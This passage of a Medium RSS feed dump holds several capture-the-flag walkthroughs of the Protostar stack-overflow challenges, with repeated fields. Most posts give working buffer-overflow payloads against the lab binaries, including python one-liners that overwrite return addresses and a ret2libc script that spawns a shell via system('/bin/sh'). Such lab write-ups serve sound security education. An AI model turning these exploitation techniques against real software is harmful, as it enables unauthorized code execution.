\u2018MONA LISA\u2019 of a\u00a0stack..</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*rNR2IXCUhthan0J-PX8znw.png\"><figcaption>5th instruction</figcaption></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*AyD4r7zdsVq8bov4gtf3-Q.png\"><figcaption>6th instruction</figcaption></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*OB2Srp4bzKBHKutUNquPQg.png\"><figcaption>My \u2018Mona-Lisa\u2019 stack</figcaption></figure><p>EY..EY! DON\u2019T LAUGH AT MY MASTERPIECE(\uff89\u0ca5\u76ca\u0ca5\uff09\uff89 \u253b\u2501\u253b.</p>\n<h3>EXPLOITATION:</h3>\n<p>Now for the juicy part\u00a0HACKING!</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/640/1*C3a1JyNvxgDKwDiZxn7tPw.gif\"></figure><p>Now since we know how the stack looks thanks to my artwork, we can finally decide on much bytes to be sent to reach the eip region/return area.</p>\n<blockquote>bufferspace+8bytes +ebp=64+8+4=76bytes</blockquote>\n<p>So we need 76 bytes to reach the eip region. But return to\u00a0where???</p>\n<p>This is where shellcodes come into play. We write our shellcode first into the buffer space and then pad it all to the eip/return region and return it to the shellcode area.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*bXhM1KaTm222DU3jLcqg7g.png\"><figcaption>Plan of\u00a0attack!</figcaption></figure><p>Our shellcode is of 28 bytes, our buffer is 64bytes which means after writing the shellcode I have 36 bytes of buffer space remaining.</p>\n<blockquote>bufferspace+8bytes +ebp=36+8+4=48bytes</blockquote>\n<p>Now we have to find tge start of the buffer space. As we can see on our Plan of attack! diagram, the start of buffer space os esp+0x10.</p>\n<p>To find our esp address. Set a breakpoint at main and run the\u00a0gdb.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/470/1*35ndvml55BWzKuQH7w2wxg.png\"></figure><p>Ok so our esp value ends with 60 and we add 0x10 to it and we\u00a0get</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/278/1*J_YozNEZdvIDR3SFM-fZww.png\"></figure><p>So according to our calculations, this must be exactly where our buffer area\u00a0starts.</p>\n<p>Time to put up the\u00a0payload!</p>\n<h3>payload:</h3>\n<p>Our payload is simple, write the shellcode in the buffer, padded it till eip region, and the return to the space where the shellcode was written so that the program will execute\u00a0it</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/393/1*2-inKeAhQ2P-I864virwmg.png\"></figure><p>Now in order to send this payload, we have to copy this to a file and then cat it to the binary\u00a0file.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/808/1*eumMZcexz_Vtz-PCC7BSHw.png\"></figure><p>BOOM! shell! \u033f\u033f \u033f\u033f \u033f\u033f \u033f\u2019\u033f\u2019\\\u0335\u0347\u033f\u033f\\\u0437= ( \u2580 \u035c\u035e\u0296\u2580) =\u03b5/\u0335\u0347\u033f\u033f/\u2019\u033f\u2019\u033f \u033f \u033f\u033f \u033f\u033f\u00a0\u033f\u033f</p>\n<p>BUT! there is a catch to this. This won\u2019t work all the time because of stack alignment and current directory and so on and so\u00a0forth.</p>\n<p>So what can we do about that? How do we rectify this situation? where else can we inject our code. FOOD FOR THOUGHT!(\u3145\u00b4 \u02d8\u00a0`)\u2661</p>\n<p>I will explain it in my upcoming posts. Until then take care, bye\u00a0byee!</p>\n<p>If you think this walkthrough helped you in any way please do leave a like and thank you once again for reading.\u00a0:)</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=12cbfe97a8b6\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["stack6","hacking","protostar-walkthrough"]},{"title":"PROTOSTAR WALKTHROUGH STACK-6","pubDate":"2021-12-23 18:48:39","link":"https://tejas303525.medium.com/protostar-walkthrough-stack-6-301fb31dc91d?source=rss-aabefe26c4b3------2","guid":"https://medium.com/p/301fb31dc91d","author":"Prof.bubs","thumbnail":"","description":"\n<p>Hello hackers! hope you are all doing well. It\u2019s been a while since I posted something on my medium page. So without wasting any more of our precious time let us jump straight into\u00a0hacking.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/581/1*WFIFZln-p7Ljv28V8k7_Dg.png\"><figcaption><a href=\"https://exploit.education/protostar/stack-six/\">https://exploit.education/protostar/stack-six/</a></figcaption></figure><p>This particular challenge can be solved in multiple ways but the method I am about to adopt is ret2libc.</p>\n<p><strong>So first off\u2026What is\u00a0libc????</strong></p>\n<p>Well, libc stands for the library of c. It contains all the functions that a c program needs. For most of the programs that are coded these days, libc library is not involved at all because it is quite vulnerable.</p>\n<p>Now you may wonder..how possibly could a library full of c functions be exploited?</p>\n<p><strong>How is it vulnerable?</strong></p>\n<p>There is a particular function at c that we are PaRtIcUlArLy interested at( \u0ca0\u25e1\u0ca0 ). Its called the <strong>system</strong> function. Inside this system function, we have the command to pop open a shell on any system by simply calling it. We will be basically manipulating our payload to call the libc and executing the system(\"/bin/sh\").</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*5Tg-VjXA6uYBkVBU8a7EAw.png\"><figcaption><a href=\"https://www.youtube.com/watch?v=FvQYGAM1X9U&amp;t=483s\">https://www.youtube.com/watch?v=FvQYGAM1X9U&amp;t=483s</a></figcaption></figure><p>As the diagram suggests, first we call the system function, and then at 4 bytes offset we have our\u00a0/bin/sh.</p>\n<p>ENOUGH LECTURE! IT\u2019S BOOORING\u2026.. let's start\u00a0hamking!</p>\n<p><strong>/opt/protostar/bin/stack6</strong></p>\n<p>Okay, It's time to assemble our avengers(addresses).</p>\n<p>First thing\u2019s first let's find our exact\u00a0offset.</p>\n<pre>char buffer[64];<br>unsigned int ret;</pre>\n<p>From the program, we understand that we have about 4 bytes of ret on top of the stack and then 64 bytes of buffer space to overcome and then 4 bytes to overcome ebp. Now, all we have to find is the exact amount of padding that we need. After a few trials and errors, I found out that it's about 8\u00a0bytes.</p>\n<p>So we have 4+64+4+8=80 bytes to reach the eip region. Now, all we have to do is find our system and bin_sh. These are the commands and methods to be followed:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*wYeZq6gP6wiNMmAEsGC5ZA.png\"></figure><p>First, open gdb, break main and then run the program once. Once the program is finished running. We can see our program\u2019s process dynamically being linked to libc with the following command:</p>\n<blockquote>info proc\u00a0mapping</blockquote>\n<p>Onto finding our /bin/sh inside libc. We can do so by the following command line (strings -a -t x \u2018starting name of libc.so\u2019) | grep \u2018/bin/sh\u2019. Which in our case would look like\u00a0this:</p>\n<blockquote>(strings -a -t x /lib/libc-2.11.2.so) | grep \u2018/bin/sh\u2019</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*fQfq1XO9g3q4_tmuqND9AA.png\"></figure><p>Now we have to add the first address of libc and the value we received with the help of\u00a0strings.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/409/1*hpU5_g-EhklMj0C3GcOLDA.png\"></figure><p>AND VOILA!! we have our /bin/sh address from libc. One more address is needed to solve our puzzle which is the address of system. it is soo simple to find all we have to do\u00a0is:</p>\n<blockquote>p system</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/779/1*4warmtMN-T7omfXlm6f4ZQ.png\"></figure><p>Its time to put all these pieces together.</p>\n<p><strong>EXPLOITATION</strong></p>\n<p>Like I told earlier our payload must contain enough buffer to get to eip region and then return to libc, call the system function, and pop open a shell using\u00a0/bin/sh.</p>\n<p>Putting all this together in a python file called xpl.py and we get\u00a0this:</p>\n<blockquote>padding =\u00a0\u2018A\u2019*80</blockquote>\n<blockquote>system= \u2018\\xb0\\xff\\xec\\xb7\u2019<br>ret=\u2019C\u2019*4<br>sh = \u2018\\xbf\\x63\\xfb\\xb7\u2019<br>print padding + system + ret+\u00a0sh</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*4Kmx7bRPyITSWuVMsKkJog.png\"></figure><p>And that\u2019s it folks we have got our shell. Hope you gained some bit of knowledge and understanding from this write-up. If you did, please do consider liking my writeups, and if not\u2026\u2026.still consider liking it pleeeeeeaseeee.</p>\n<p>Goodbye and happy hacking( \u25dc\u25d2\u25dd\u00a0)\u2661</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=301fb31dc91d\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<p>Hello hackers! hope you are all doing well. It\u2019s been a while since I posted something on my medium page. So without wasting any more of our precious time let us jump straight into\u00a0hacking.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/581/1*WFIFZln-p7Ljv28V8k7_Dg.png\"><figcaption><a href=\"https://exploit.education/protostar/stack-six/\">https://exploit.education/protostar/stack-six/</a></figcaption></figure><p>This particular challenge can be solved in multiple ways but the method I am about to adopt is ret2libc.</p>\n<p><strong>So first off\u2026What is\u00a0libc????</strong></p>\n<p>Well, libc stands for the library of c. It contains all the functions that a c program needs. For most of the programs that are coded these days, libc library is not involved at all because it is quite vulnerable.</p>\n<p>Now you may wonder..how possibly could a library full of c functions be exploited?</p>\n<p><strong>How is it vulnerable?</strong></p>\n<p>There is a particular function at c that we are PaRtIcUlArLy interested at( \u0ca0\u25e1\u0ca0 ). Its called the <strong>system</strong> function. Inside this system function, we have the command to pop open a shell on any system by simply calling it. We will be basically manipulating our payload to call the libc and executing the system(\"/bin/sh\").</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*5Tg-VjXA6uYBkVBU8a7EAw.png\"><figcaption><a href=\"https://www.youtube.com/watch?v=FvQYGAM1X9U&amp;t=483s\">https://www.youtube.com/watch?v=FvQYGAM1X9U&amp;t=483s</a></figcaption></figure><p>As the diagram suggests, first we call the system function, and then at 4 bytes offset we have our\u00a0/bin/sh.</p>\n<p>ENOUGH LECTURE! IT\u2019S BOOORING\u2026.. let's start\u00a0hamking!</p>\n<p><strong>/opt/protostar/bin/stack6</strong></p>\n<p>Okay, It's time to assemble our avengers(addresses).</p>\n<p>First thing\u2019s first let's find our exact\u00a0offset.</p>\n<pre>char buffer[64];<br>unsigned int ret;</pre>\n<p>From the program, we understand that we have about 4 bytes of ret on top of the stack and then 64 bytes of buffer space to overcome and then 4 bytes to overcome ebp. Now, all we have to find is the exact amount of padding that we need. After a few trials and errors, I found out that it's about 8\u00a0bytes.</p>\n<p>So we have 4+64+4+8=80 bytes to reach the eip region. Now, all we have to do is find our system and bin_sh. These are the commands and methods to be followed:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*wYeZq6gP6wiNMmAEsGC5ZA.png\"></figure><p>First, open gdb, break main and then run the program once. Once the program is finished running. We can see our program\u2019s process dynamically being linked to libc with the following command:</p>\n<blockquote>info proc\u00a0mapping</blockquote>\n<p>Onto finding our /bin/sh inside libc. We can do so by the following command line (strings -a -t x \u2018starting name of libc.so\u2019) | grep \u2018/bin/sh\u2019. Which in our case would look like\u00a0this:</p>\n<blockquote>(strings -a -t x /lib/libc-2.11.2.so) | grep \u2018/bin/sh\u2019</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*fQfq1XO9g3q4_tmuqND9AA.png\"></figure><p>Now we have to add the first address of libc and the value we received with the help of\u00a0strings.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/409/1*hpU5_g-EhklMj0C3GcOLDA.png\"></figure><p>AND VOILA!! we have our /bin/sh address from libc. One more address is needed to solve our puzzle which is the address of system. it is soo simple to find all we have to do\u00a0is:</p>\n<blockquote>p system</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/779/1*4warmtMN-T7omfXlm6f4ZQ.png\"></figure><p>Its time to put all these pieces together.</p>\n<p><strong>EXPLOITATION</strong></p>\n<p>Like I told earlier our payload must contain enough buffer to get to eip region and then return to libc, call the system function, and pop open a shell using\u00a0/bin/sh.</p>\n<p>Putting all this together in a python file called xpl.py and we get\u00a0this:</p>\n<blockquote>padding =\u00a0\u2018A\u2019*80</blockquote>\n<blockquote>system= \u2018\\xb0\\xff\\xec\\xb7\u2019<br>ret=\u2019C\u2019*4<br>sh = \u2018\\xbf\\x63\\xfb\\xb7\u2019<br>print padding + system + ret+\u00a0sh</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*4Kmx7bRPyITSWuVMsKkJog.png\"></figure><p>And that\u2019s it folks we have got our shell. Hope you gained some bit of knowledge and understanding from this write-up. If you did, please do consider liking my writeups, and if not\u2026\u2026.still consider liking it pleeeeeeaseeee.</p>\n<p>Goodbye and happy hacking( \u25dc\u25d2\u25dd\u00a0)\u2661</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=301fb31dc91d\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["buffer-overflow","stack","protostar-walkthrough"]},{"title":"PROTOSTAR WALKTHROUGH STACK-4","pubDate":"2021-09-09 09:09:40","link":"https://tejas303525.medium.com/protostar-walkthrough-stack-4-4c46bb652dbc?source=rss-aabefe26c4b3------2","guid":"https://medium.com/p/4c46bb652dbc","author":"Prof.bubs","thumbnail":"","description":"\n<p>Hello hackers! hope you are all doing well and good. Let us jump to stack4 of our protostar</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/444/1*7dA6nQx3hROUz1mEEM9m0A.png\"><figcaption><a href=\"https://exploit.education/protostar/stack-four/\">https://exploit.education/protostar/stack-four/</a></figcaption></figure><p>This challenge seems quite similar to the previous one but the only difference is we have to overflow the buffer space and get to eip region and throw in the win function\u2019s address and that should give us our required output. Now let's put our theory to the\u00a0test!.</p>\n<p><strong>/opt/protostar/bin/stack4</strong></p>\n<p>Let us first find out our win functions address:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/958/1*VJ2MoY0VMeXQgAErC3a-jA.png\"></figure><p>Now calculating the buffer needed to get into eip\u00a0:</p>\n<p>buffer(64 bytes)+padding(8bytes) + ebp(4bytes)</p>\n<p>After using my brains to solve this complex math problem I found out that 76 bytes are needed to get to eip region (\u2580\u033f\u0139\u032f\u2580\u033f \u033f) and then by giving the win functions address we will get our\u00a0output.</p>\n<p>So this is our\u00a0payload:</p>\n<blockquote>(python -c \u201cprint \u2018A\u2019*75 + \u2018\\xf4\\x83\\x04\\x08\u2019\u201d) |\u00a0./stack4</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*1gG5oX3wSWNTDdFKLZl3aQ.png\"></figure><p>And voila! \u03a3(-\u1dc5_-\u1dc4\u0e51)!</p>\n<p>That's the end of stack 4. More of these stack challenge series are yet to be released. If you think this walkthrough helped you in any way please do leave a like and thank you once again for reading.\u00a0:)</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=4c46bb652dbc\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<p>Hello hackers! hope you are all doing well and good. Let us jump to stack4 of our protostar</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/444/1*7dA6nQx3hROUz1mEEM9m0A.png\"><figcaption><a href=\"https://exploit.education/protostar/stack-four/\">https://exploit.education/protostar/stack-four/</a></figcaption></figure><p>This challenge seems quite similar to the previous one but the only difference is we have to overflow the buffer space and get to eip region and throw in the win function\u2019s address and that should give us our required output. Now let's put our theory to the\u00a0test!.</p>\n<p><strong>/opt/protostar/bin/stack4</strong></p>\n<p>Let us first find out our win functions address:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/958/1*VJ2MoY0VMeXQgAErC3a-jA.png\"></figure><p>Now calculating the buffer needed to get into eip\u00a0:</p>\n<p>buffer(64 bytes)+padding(8bytes) + ebp(4bytes)</p>\n<p>After using my brains to solve this complex math problem I found out that 76 bytes are needed to get to eip region (\u2580\u033f\u0139\u032f\u2580\u033f \u033f) and then by giving the win functions address we will get our\u00a0output.</p>\n<p>So this is our\u00a0payload:</p>\n<blockquote>(python -c \u201cprint \u2018A\u2019*75 + \u2018\\xf4\\x83\\x04\\x08\u2019\u201d) |\u00a0./stack4</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*1gG5oX3wSWNTDdFKLZl3aQ.png\"></figure><p>And voila! \u03a3(-\u1dc5_-\u1dc4\u0e51)!</p>\n<p>That's the end of stack 4. More of these stack challenge series are yet to be released. If you think this walkthrough helped you in any way please do leave a like and thank you once again for reading.\u00a0:)</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=4c46bb652dbc\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["protostar-walkthrough","stackoverflow"]},{"title":"PROTOSTAR WALKTHROUGH-STACK3","pubDate":"2021-08-29 17:36:33","link":"https://tejas303525.medium.com/protostar-walkthrough-stack3-af2f3f2f12c8?source=rss-aabefe26c4b3------2","guid":"https://medium.com/p/af2f3f2f12c8","author":"Prof.bubs","thumbnail":"","description":"\n<p>Hello hackers! hope you are all doing well and good. Let us jump to stack3 of our protostar</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/743/1*PdOFg56ULfXTF0oF7K6UpA.png\"><figcaption><a href=\"https://exploit.education/protostar/stack-three/\">https://exploit.education/protostar/stack-three/</a></figcaption></figure><p>As we can see that our required output is inside the win() function which is never called on our main function. So all we have to do is overflow the buffer space and call the win function. Before that let us draw a simple stack diagram for this\u00a0program.</p>\n<p>STACK-DIAGRAM:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*8kQq9mxIiV2zk80R6yB5DQ.png\"></figure><p>Shuddup, don\u2019t laugh at my\u00a0diagram.</p>\n<p>In the given program we can see that volatile int(*fp) gets pushed before the buffer. So what is this volatile(*fp). According to StackOverflow\u2019s definition</p>\n<blockquote>volatile is to tell the compiler not to optimize the reference, so that every read/write does not use the value stored in register but does a real memory\u00a0access.</blockquote>\n<p>Aha!. It tells us that it can do real memory access, which means it will access our win functions if we give it the win functions address. We dont even have to get all the way to eip/ ret\u00a0address.</p>\n<p>Now we find our win functions address using gdb. In gdb after keeping a break main and running it, we simply need to use the\u00a0command:</p>\n<blockquote>p win</blockquote>\n<p>to find win functions address.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/613/1*XX8Fuyao2aJPlkUgFhc0Vg.png\"></figure><p>Now we can build our\u00a0payload:</p>\n<blockquote>(python -c \u201cprint \u2018A\u2019*64 + \u2018\\x24\\x84\\x04\\x08\u2019\u201d)|./stack3</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/909/1*q-oT0mlZ-iIcEzuRcfD1EQ.png\"></figure><p>And voila! Just like that we got what we\u00a0wanted.</p>\n<p>That is going to be it for stack3. More of this stack series is yet to be released. Until then take care and bye\u00a0bye</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=af2f3f2f12c8\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<p>Hello hackers! hope you are all doing well and good. Let us jump to stack3 of our protostar</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/743/1*PdOFg56ULfXTF0oF7K6UpA.png\"><figcaption><a href=\"https://exploit.education/protostar/stack-three/\">https://exploit.education/protostar/stack-three/</a></figcaption></figure><p>As we can see that our required output is inside the win() function which is never called on our main function. So all we have to do is overflow the buffer space and call the win function. Before that let us draw a simple stack diagram for this\u00a0program.</p>\n<p>STACK-DIAGRAM:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*8kQq9mxIiV2zk80R6yB5DQ.png\"></figure><p>Shuddup, don\u2019t laugh at my\u00a0diagram.</p>\n<p>In the given program we can see that volatile int(*fp) gets pushed before the buffer. So what is this volatile(*fp). According to StackOverflow\u2019s definition</p>\n<blockquote>volatile is to tell the compiler not to optimize the reference, so that every read/write does not use the value stored in register but does a real memory\u00a0access.</blockquote>\n<p>Aha!. It tells us that it can do real memory access, which means it will access our win functions if we give it the win functions address. We dont even have to get all the way to eip/ ret\u00a0address.</p>\n<p>Now we find our win functions address using gdb. In gdb after keeping a break main and running it, we simply need to use the\u00a0command:</p>\n<blockquote>p win</blockquote>\n<p>to find win functions address.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/613/1*XX8Fuyao2aJPlkUgFhc0Vg.png\"></figure><p>Now we can build our\u00a0payload:</p>\n<blockquote>(python -c \u201cprint \u2018A\u2019*64 + \u2018\\x24\\x84\\x04\\x08\u2019\u201d)|./stack3</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/909/1*q-oT0mlZ-iIcEzuRcfD1EQ.png\"></figure><p>And voila! Just like that we got what we\u00a0wanted.</p>\n<p>That is going to be it for stack3. More of this stack series is yet to be released. Until then take care and bye\u00a0bye</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=af2f3f2f12c8\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["protostar-walkthrough","hacking","stackoverflow"]},{"title":"PROTOSTAR WALKTHROUGH-stack 2","pubDate":"2021-08-23 14:43:04","link":"https://tejas303525.medium.com/protostar-walkthrough-stack-1-5f112e4291cc?source=rss-aabefe26c4b3------2","guid":"https://medium.com/p/5f112e4291cc","author":"Prof.bubs","thumbnail":"","description":"\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/396/1*mTDpyEqXxz9aBh3DKpS1Vw.jpeg\"></figure><p>Hello hackers! hope you are all doing well today. Now that we have done stack-2. We will now move onto\u00a0stack3.</p>\n<p><strong>SOURCE CODE:</strong></p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/583/1*w6HmeAaCWFIw2YFK0OU0qA.png\"><figcaption><a href=\"https://exploit.education/protostar/stack-two/\">https://exploit.education/protostar/stack-two/</a></figcaption></figure><p>On analysing we can immediately tell that our required answer is in the modified space. We just need to buffer overflow it and give the modified address in a little endian format. But the actual problem is how are we going to inject our\u00a0payload?</p>\n<p><strong>/opt/protostar/bin/stack3:</strong></p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/557/1*0LAeGbFVw2jOMnUtYnpRnw.png\"></figure><p>So the program says to set an environment variable. But first what is the environment variable?</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/595/1*RzCSxX7znbbw2kES6JwEWA.png\"></figure><p>These are the systems environment variables. According to google, An environment variable is <strong>a variable whose value is set outside the\u00a0program.</strong></p>\n<p>So it seems we have to set a value to our environment variable \u2018GREENIE\u2019. We can do so by the following method.</p>\n<blockquote>GREENIE=hacker(anything)</blockquote>\n<blockquote>export GREENIE</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/486/1*qs3jTYlbuFm8XHcXUOTLTA.png\"></figure><p>Clearly, our output value has changed. Now we are about to inject our payload in a similar manner but instead of something random, we will give the\u00a0payload:</p>\n<blockquote>GREENIE=`(python -c \u2018print \u201cA\u201d*64 + \u201c\\x0a\\x0d\\x0a\\x0d\u201d \u2019)`</blockquote>\n<blockquote>export GREENIE</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/721/1*kBeV2hvCQEib9TfSOoleGA.png\"></figure><p>Things we have to remember\u00a0are:</p>\n<ol>\n<li>We are passing this as an argument to the environment variable so there should be either \u201c$\u201d symbol or \u201c`\u201d\u00a0symbol.</li>\n<li>Remember not to give any spaces between GREENIE and the \u201c=\u201d symbol as the system will consider the empty space as a variable and will pop you an error\u00a0message.</li>\n</ol>\n<p>So that is going to be the end of stack2. More is yet to be released, untill then take care bye bye\u00a0:).</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=5f112e4291cc\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/396/1*mTDpyEqXxz9aBh3DKpS1Vw.jpeg\"></figure><p>Hello hackers! hope you are all doing well today. Now that we have done stack-2. We will now move onto\u00a0stack3.</p>\n<p><strong>SOURCE CODE:</strong></p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/583/1*w6HmeAaCWFIw2YFK0OU0qA.png\"><figcaption><a href=\"https://exploit.education/protostar/stack-two/\">https://exploit.education/protostar/stack-two/</a></figcaption></figure><p>On analysing we can immediately tell that our required answer is in the modified space. We just need to buffer overflow it and give the modified address in a little endian format. But the actual problem is how are we going to inject our\u00a0payload?</p>\n<p><strong>/opt/protostar/bin/stack3:</strong></p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/557/1*0LAeGbFVw2jOMnUtYnpRnw.png\"></figure><p>So the program says to set an environment variable. But first what is the environment variable?</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/595/1*RzCSxX7znbbw2kES6JwEWA.png\"></figure><p>These are the systems environment variables. According to google, An environment variable is <strong>a variable whose value is set outside the\u00a0program.</strong></p>\n<p>So it seems we have to set a value to our environment variable \u2018GREENIE\u2019. We can do so by the following method.</p>\n<blockquote>GREENIE=hacker(anything)</blockquote>\n<blockquote>export GREENIE</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/486/1*qs3jTYlbuFm8XHcXUOTLTA.png\"></figure><p>Clearly, our output value has changed. Now we are about to inject our payload in a similar manner but instead of something random, we will give the\u00a0payload:</p>\n<blockquote>GREENIE=`(python -c \u2018print \u201cA\u201d*64 + \u201c\\x0a\\x0d\\x0a\\x0d\u201d \u2019)`</blockquote>\n<blockquote>export GREENIE</blockquote>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/721/1*kBeV2hvCQEib9TfSOoleGA.png\"></figure><p>Things we have to remember\u00a0are:</p>\n<ol>\n<li>We are passing this as an argument to the environment variable so there should be either \u201c$\u201d symbol or \u201c`\u201d\u00a0symbol.</li>\n<li>Remember not to give any spaces between GREENIE and the \u201c=\u201d symbol as the system will consider the empty space as a variable and will pop you an error\u00a0message.</li>\n</ol>\n<p>So that is going to be the end of stack2. More is yet to be released, untill then take care bye bye\u00a0:).</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=5f112e4291cc\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["protostar","stack"]},{"title":"PROTOSTAR WALKTHROUGH-Stack-1","pubDate":"2021-08-18 15:54:54","link":"https://tejas303525.medium.com/protostar-walkthrough-stack-1-8bf58a441cf7?source=rss-aabefe26c4b3------2","guid":"https://medium.com/p/8bf58a441cf7","author":"Prof.bubs","thumbnail":"","description":"\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*jy8ZWxIqtfRBEJw3.jpg\"><figcaption>source:<a href=\"https://hacksland.net/\">hacksland.net</a></figcaption></figure><p>Hello hackers! hope you are all doing well today. Now that we have done stack-0 and have a basic idea of how a stack frame is built, we can move on to\u00a0stack-1.</p>\n<p><strong>SOURCE CODE:</strong></p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/679/1*xc9U1hVSHty4sAqPVYqdOg.png\"><figcaption>source: <a href=\"https://exploit.education/protostar/stack-one/\">https://exploit.education/protostar/stack-one/</a></figcaption></figure><p><strong>/opt/protostar/bin/stack1:</strong></p>\n<p>Let us analyze the given code, seems like a modified variable is created first and then pushed down the stack and a buffer of space 64 is created. Pretty much like stack 0. You can refer the stack 0 from my previous write-up by clicking <a href=\"https://tejas303525.medium.com/protostar-walkthrough-stack0-484abfebf1c1\">here</a>\u00a0:). But here we see there is NO gets function, so where exactly can we inject our payload?!.</p>\n<p>When we run the code we get asked for an argument. We can see it in the code\u00a0itself.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/669/1*kI7-SMSgjiUXyS9pon5XZQ.png\"></figure><p>So that\u2019s gonna be our way in to inject our payload. In order to pass an argument, we can either use a tilde operator (\u201c ` \")or a (\u201c $ \u201d)\u00a0symbol</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/669/1*-tJt_9Sq21XLPNGwa7lXIQ.png\"></figure><p>Now our error message is different from the first time,so clearly we can pass our payload as an argument\u00a0. Now what to do next. Let us have a look at our code. It has a condition that says \u2018<strong>modified= 0x61626364</strong>\u2019. So that's how we get to the modified space. Now our payload is going to\u00a0be:</p>\n<blockquote>./stack1 $(python -c \u2018print \u201cA\u201d*64 + \u201c\\x64\\x63\\x62\\x61\u201d\u2019)</blockquote>\n<p>Our payload says the program to fill the buffer space 64 times with random characters (A according to my payload) and then specify the address of the modified variable.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/721/1*C36p1d6tII60FmVlct0pfw.png\"></figure><p>You might wonder why we used 64 bytes instead of 65 bytes like the last time. Well here is the reason. In the last question, we just needed to overwrite the buffer space and stand on top of the modified space and that will print us the required output. But in this payload, we print exactly 64 times so that we overwrite buffer space and stand on the starting line of modified space and then we can give the correct address to the modified space to get our required output\u00a0:D.</p>\n<p>That is going to be a walkthrough of stack 1. Hope you have understood the concept clearly. More of the stack walkthroughs are yet to be released, until then take care, bye bye\u00a0:).</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=8bf58a441cf7\" width=\"1\" height=\"1\" 